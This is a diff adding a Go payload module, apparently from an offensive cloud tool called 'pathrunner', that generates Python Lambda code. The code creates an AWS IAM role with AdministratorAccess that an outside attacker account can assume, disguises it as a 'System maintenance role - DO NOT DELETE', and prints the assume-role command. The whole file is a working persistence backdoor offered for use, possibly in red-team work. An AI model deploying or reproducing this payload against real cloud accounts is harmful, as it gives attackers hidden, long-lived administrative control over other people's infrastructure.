@@ -1,0 +1,256 @@
+package lambda
+
+import (
+	"encoding/json"
+	"fmt"
+	"pathrunner/pkg/modules"
+	"pathrunner/pkg/payloads"
+	"strings"
+)
+
+type BackdoorRolePayload struct{}
+
+func NewBackdoorRolePayload() *BackdoorRolePayload {
+	return &BackdoorRolePayload{}
+}
+
+func init() {
+	payloads.Register(NewBackdoorRolePayload())
+}
+
+func (p *BackdoorRolePayload) GetName() string {
+	return "backdoor/role"
+}
+
+func (p *BackdoorRolePayload) GetDescription() string {
+	return "Create an IAM role with administrator privileges and cross-account trust"
+}
+
+func (p *BackdoorRolePayload) GetTags() []string {
+	return []string{
+		payloads.TagServiceLambda,
+		payloads.TagLanguagePython,
+		payloads.TagTechniqueBackdoor,
+		payloads.TagTransportOutput,
+	}
+}
+
+func (p *BackdoorRolePayload) GetOptions() []modules.Option {
+	return []modules.Option{
+		{
+			Name:        "BACKDOOR_ACCOUNT",
+			Description: "Your AWS account ID for the trust relationship",
+			Required:    true,
+		},
+		{
+			Name:        "ROLE_NAME",
+			Description: "Name for the backdoor role",
+			Required:    false,
+			Default:     "",
+		},
+		{
+			Name:        "EXTERNAL_ID",
+			Description: "External ID for added security (optional)",
+			Required:    false,
+			Default:     "",
+		},
+		{
+			Name:        "ROLE_PATH",
+			Description: "IAM path for the role",
+			Required:    false,
+			Default:     "/",
+		},
+	}
+}
+
+func (p *BackdoorRolePayload) GenerateCode(options map[string]string) (string, error) {
+	backdoorAccount := options["BACKDOOR_ACCOUNT"]
+	roleName := options["ROLE_NAME"]
+	externalID := options["EXTERNAL_ID"]
+	rolePath := options["ROLE_PATH"]
+	if rolePath == "" {
+		rolePath = "/"
+	}
+
+	roleNameCode := ""
+	if roleName != "" {
+		roleNameCode = "'" + roleName + "'"
+	} else {
+		roleNameCode = "f'pathrunner-backdoor-{int(time.time())}'"
+	}
+
+	trustPolicyCode := `{
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Effect": "Allow",
+                "Principal": {
+                    "AWS": "arn:aws:iam::` + backdoorAccount + `:root"
+                },
+                "Action": "sts:AssumeRole"`
+
+	if externalID != "" {
+		trustPolicyCode += `,
+                "Condition": {
+                    "StringEquals": {
+                        "sts:ExternalId": "` + externalID + `"
+                    }
+                }`
+	}
+
+	trustPolicyCode += `
+            }
+        ]
+    }`
+
+	code := `import json
+import boto3
+import time
+import random
+import string
+
+def lambda_handler(event, context):
+    result = {
+        'message': 'Pathrunner backdoor role creation',
+        'timestamp': context.aws_request_id,
+        'status': 'started'
+    }
+
+    try:
+        iam_client = boto3.client('iam')
+
+        # Generate role name if not specified
+        role_name = ` + roleNameCode + `
+
+        # Trust policy allowing the attacker account to assume the role
+        trust_policy = '''` + trustPolicyCode + `'''
+
+        # Administrator access policy
+        admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+
+        # Create the backdoor role
+        role_response = iam_client.create_role(
+            RoleName=role_name,
+            AssumeRolePolicyDocument=trust_policy,
+            Path='` + rolePath + `',
+            Description='System maintenance role - DO NOT DELETE',
+            MaxSessionDuration=43200  # 12 hours
+        )
+
+        result['role_arn'] = role_response['Role']['Arn']
+        result['role_name'] = role_name
+
+        # Attach administrator policy
+        iam_client.attach_role_policy(
+            RoleName=role_name,
+            PolicyArn=admin_policy_arn
+        )
+
+        # Wait a moment for the role to be available
+        time.sleep(2)
+
+        # Test that the role was created successfully
+        get_role_response = iam_client.get_role(RoleName=role_name)
+
+        result['backdoor_account'] = '` + backdoorAccount + `'`
+
+	if externalID != "" {
+		code += `
+        result['external_id'] = '` + externalID + `'`
+	}
+
+	code += `
+        result['assume_role_command'] = f"aws sts assume-role --role-arn {result['role_arn']} --role-session-name pathrunner-session"`
+
+	if externalID != "" {
+		code += ` + f" --external-id ` + externalID + `"`
+	}
+
+	code += `
+        result['status'] = 'success'
+        result['message'] = 'Backdoor role created successfully with administrator privileges'
+
+    except iam_client.exceptions.EntityAlreadyExistsException:
+        result['status'] = 'error'
+        result['message'] = f'Role {role_name} already exists'
+    except Exception as e:
+        result['status'] = 'error'
+        result['message'] = f'Failed to create backdoor role: {str(e)}'
+
+    return {
+        'statusCode': 200,
+        'body': json.dumps(result, indent=2)
+    }
+`
+
+	return code, nil
+}
+
+func (p *BackdoorRolePayload) ProcessResult(result string) (string, error) {
+	var lambdaResponse map[string]interface{}
+	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
+		return result, err
+	}
+
+	body, ok := lambdaResponse["body"].(string)
+	if !ok {
+		return result, nil
+	}
+
+	var parsedBody map[string]interface{}
+	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
+		return result, err
+	}
+
+	var output strings.Builder
+	output.WriteString("=== Backdoor Role Creation Results ===\n\n")
+
+	if status, ok := parsedBody["status"].(string); ok {
+		if status == "success" {
+			output.WriteString("✓ Backdoor role created successfully!\n\n")
+
+			if roleArn, ok := parsedBody["role_arn"].(string); ok {
+				output.WriteString("Role ARN: " + roleArn + "\n")
+			}
+
+			if roleName, ok := parsedBody["role_name"].(string); ok {
+				output.WriteString("Role Name: " + roleName + "\n")
+			}
+
+			if backdoorAccount, ok := parsedBody["backdoor_account"].(string); ok {
+				output.WriteString("Backdoor Account: " + backdoorAccount + "\n")
+			}
+
+			if externalID, ok := parsedBody["external_id"].(string); ok {
+				output.WriteString("External ID: " + externalID + "\n")
+			}
+
+			output.WriteString("\nTo assume this role:\n")
+			if assumeCmd, ok := parsedBody["assume_role_command"].(string); ok {
+				output.WriteString("$ " + assumeCmd + "\n")
+			}
+
+			output.WriteString("\nThe role has AdministratorAccess policy attached.\n")
+			output.WriteString("Session duration: 12 hours maximum\n")
+
+		} else {
+			output.WriteString("✗ Failed to create backdoor role\n")
+			if message, ok := parsedBody["message"].(string); ok {
+				output.WriteString("Error: " + message + "\n")
+			}
+		}
+	}
+
+	if timestamp, ok := parsedBody["timestamp"].(string); ok {
+		output.WriteString("\nRequest ID: " + timestamp + "\n")
+	}
+
+	return output.String(), nil
+}
+
+func (p *BackdoorRolePayload) Validate(options map[string]string) error {
+	if options["BACKDOOR_ACCOUNT"] == "" {
+		return fmt.Errorf("BACKDOOR_ACCOUNT is required for backdoor/role payload")
+	}
+	return nil
+}
